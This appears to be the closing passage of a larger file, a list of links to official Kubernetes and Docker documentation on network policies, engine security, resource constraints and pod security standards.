- Kubernetes Network Policies: https://kubernetes.io/docs/concepts/services-networking/network-policies/
- Docker Engine Security: https://docs.docker.com/engine/security/
- Docker Resource Constraints: https://docs.docker.com/engine/containers/resource_constraints/
- Kubernetes Pod Security Standards: https://kubernetes.io/docs/concepts/security/pod-security-standards/
-->
